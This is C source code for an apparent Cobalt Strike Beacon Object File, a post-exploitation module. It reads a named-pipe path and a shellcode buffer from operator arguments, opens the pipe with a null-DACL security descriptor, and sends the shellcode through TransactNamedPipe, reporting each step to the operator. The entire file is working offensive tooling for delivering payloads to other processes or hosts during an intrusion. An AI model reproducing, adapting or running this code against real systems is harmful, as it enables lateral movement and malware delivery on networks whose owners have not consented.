#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor,
  DWORD                dwRevision);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$SetSecurityDescriptorDacl(
  PSECURITY_DESCRIPTOR pSecurityDescriptor,
  BOOL                 bDaclPresent,
  PACL                 pDacl,
  BOOL                 bDaclDefaulted
);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WaitNamedPipeA(LPCSTR lpNamedPipeName,
  DWORD  nTimeOut);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetNamedPipeHandleState(
  HANDLE  hNamedPipe,
  LPDWORD lpMode,
  LPDWORD lpMaxCollectionCount,
  LPDWORD lpCollectDataTimeout
);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$TransactNamedPipe(
  HANDLE       hNamedPipe,
  LPVOID       lpInBuffer,
  DWORD        nInBufferSize,
  LPVOID       lpOutBuffer,
  DWORD        nOutBufferSize,
  LPDWORD      lpBytesRead,
  LPOVERLAPPED lpOverlapped
);

DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);


void go(char *args, int len) {
    
    char* sc_ptr;
    SIZE_T sc_len; 
    CHAR *remotePipe;
    datap parser;
    HANDLE hPipe;

    BeaconDataParse(&parser, args, len);
    remotePipe = BeaconDataExtract(&parser, NULL);
    sc_len = BeaconDataLength(&parser);
    sc_ptr = BeaconDataExtract(&parser, NULL);


     BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Size: %d bytes\n", sc_len);

    SECURITY_DESCRIPTOR SecDesc;
    ADVAPI32$InitializeSecurityDescriptor(&SecDesc, SECURITY_DESCRIPTOR_REVISION);
    ADVAPI32$SetSecurityDescriptorDacl(&SecDesc, TRUE, NULL, FALSE);

    SECURITY_ATTRIBUTES SecAttrib = {0};
    SecAttrib.nLength = sizeof(SECURITY_ATTRIBUTES);
    SecAttrib.lpSecurityDescriptor = &SecDesc;
    SecAttrib.bInheritHandle = TRUE;


    BeaconPrintf(CALLBACK_OUTPUT, "[+] Opening handle to pipe");

    hPipe = KERNEL32$CreateFileA(remotePipe,    
        GENERIC_READ | GENERIC_WRITE,
        0,              
        &SecAttrib,           
        OPEN_EXISTING,  
        0x00100000,              
        NULL);          

    if (hPipe == INVALID_HANDLE_VALUE)
    {        
        BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to remote pipe");
        BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", KERNEL32$GetLastError());

        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Pipe handle: 0x%X", hPipe);


    KERNEL32$WaitNamedPipeA(remotePipe, NULL);

    DWORD    dwMode = PIPE_READMODE_MESSAGE;
    KERNEL32$SetNamedPipeHandleState(
        hPipe,    
        &dwMode,  
        NULL,      
        NULL);    

    DWORD cbWritten = 0;
    unsigned char *temp = (unsigned char*)MSVCRT$malloc(sc_len);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Sending shellcode to the pipe");

    BOOL result = KERNEL32$TransactNamedPipe(hPipe, sc_ptr, sc_len, temp, sc_len, &cbWritten, NULL);
    
}